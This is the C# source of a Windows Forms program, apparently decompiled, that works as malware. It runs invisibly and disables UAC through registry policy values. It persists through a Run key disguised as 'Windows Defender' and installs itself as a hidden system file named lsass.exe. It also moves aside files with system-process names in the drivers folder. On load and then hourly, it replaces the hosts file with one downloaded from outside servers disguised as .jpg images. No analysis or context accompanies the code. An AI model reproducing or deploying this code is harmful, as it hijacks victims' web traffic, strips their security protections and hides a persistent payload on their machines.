using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Bravo;

public class Form1 : Form
{
	private IContainer components = null;

	private Timer timer1;

	private string ruta;

	private string ruta1;

	private string ruta2;

	private string ruta3;

	private string name;

	private string dir;

	private string url1;

	private string url2;

	private bool exist;

	private long numero;

	private long cont;

	private WebClient webClient = new WebClient();

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(292, 266));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
	}

	public string yateloprpare(string urlx)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(urlx);
			_ = (HttpWebResponse)webRequest.GetResponse();
			return "OK";
		}
		catch (Exception)
		{
			return "No vale";
		}
	}

	public void RunStartup()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("Windows Defender", ruta);
	}

	public bool chopelaquichatero()
	{
		RegistryKey localMachine = Registry.LocalMachine;
		localMachine = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
		localMachine.SetValue("EnableLUA", 0);
		localMachine.SetValue("EnableSecureUIAPaths", 0);
		localMachine.SetValue("FilterAdministratorToken", 0);
		localMachine.SetValue("ValidateAdminCodeSignatures", 0);
		localMachine.SetValue("EnableUIADesktopToggle", 0);
		localMachine.SetValue("ConsentPromptBehaviorAdmin", 0);
		localMachine.SetValue("EnableInstallerDetection", 0);
		RunStartup();
		localMachine.Close();
		return true;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		url1 = "http://www.diocesiscoriacaceres.es/menuderecho/IIICongreso/logoencuentros.jpg";
		url2 = "http://www.mbaparksevents.com/ficheros/30c1_3_120_1701.jpg";
		dir = "C:\\Windows\\System32\\drivers\\etc\\hosts";
		ruta = "C:\\WINDOWS\\system32\\drivers\\lsass.exe";
		ruta1 = "C:\\WINDOWS\\system32\\drivers\\winlogon.exe";
		ruta2 = "C:\\WINDOWS\\system32\\drivers\\csrss.exe";
		ruta3 = "C:\\WINDOWS\\system32\\drivers\\smss.exe";
		name = "PostalTerra";
		cont = 0L;
		timer1.set_Enabled(true);
		chopelaquichatero();
		Random random = new Random(DateTime.Now.Millisecond);
		numero = random.Next(10000, 100000);
		exist = File.Exists(dir);
		if (exist)
		{
			File.Move(dir, "C:\\Windows\\System32\\drivers\\etc\\" + Convert.ToString(numero));
		}
		if (yateloprpare(url1) == "OK")
		{
			webClient.DownloadFile(url1, dir);
		}
		else if (yateloprpare(url2) == "OK")
		{
			webClient.DownloadFile(url2, dir);
		}
		numero = random.Next(10000, 100000);
		exist = File.Exists(ruta1);
		if (exist)
		{
			File.Move(ruta1, "C:\\WINDOWS\\system32\\drivers\\" + Convert.ToString(numero));
		}
		numero = random.Next(10000, 100000);
		exist = File.Exists(ruta2);
		if (exist)
		{
			File.Move(ruta2, "C:\\WINDOWS\\system32\\drivers\\" + Convert.ToString(numero));
		}
		numero = random.Next(10000, 100000);
		exist = File.Exists(ruta3);
		if (exist)
		{
			File.Move(ruta3, "C:\\WINDOWS\\system32\\drivers\\" + Convert.ToString(numero));
		}
		exist = File.Exists(ruta);
		if (!exist)
		{
			File.Copy(name + ".exe", ruta);
			File.SetAttributes(ruta, FileAttributes.Hidden);
			File.SetAttributes(ruta, FileAttributes.System);
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		cont++;
		if (cont == 36000L)
		{
			Random random = new Random(DateTime.Now.Millisecond);
			numero = random.Next(10000, 100000);
			exist = File.Exists(dir);
			if (exist)
			{
				File.Move(dir, "C:\\Windows\\System32\\drivers\\etc\\" + Convert.ToString(numero));
			}
			if (yateloprpare(url1) == "OK")
			{
				webClient.DownloadFile(url1, dir);
			}
			else if (yateloprpare(url2) == "OK")
			{
				webClient.DownloadFile(url2, dir);
			}
			cont = 0L;
		}
	}
}
